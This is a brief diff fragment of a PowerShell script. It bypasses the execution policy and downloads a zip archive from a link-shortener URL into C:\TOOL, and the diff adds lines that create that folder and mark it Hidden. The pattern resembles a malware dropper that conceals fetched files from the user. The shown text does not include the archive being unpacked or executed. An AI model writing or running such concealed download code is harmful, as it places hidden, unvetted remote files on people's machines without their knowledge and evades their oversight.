@@ -2,6 +2,10 @@ Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
 
 $TOOL = {"C:\TOOL"}
 
+[System.IO.Directory]::CreateDirectory($TOOL)
+$TOOLFOLDER = Get-Item $TOOL 
+$TOOLFOLDER.Attributes = "Hidden" 
+
 $webClient = New-Object -TypeName System.Net.WebClient
 $task = $webClient.DownloadFileTaskAsync("https://seulink.net/TOOLZIP", "$TOOL\#TOOL#ZIP.zip")
 
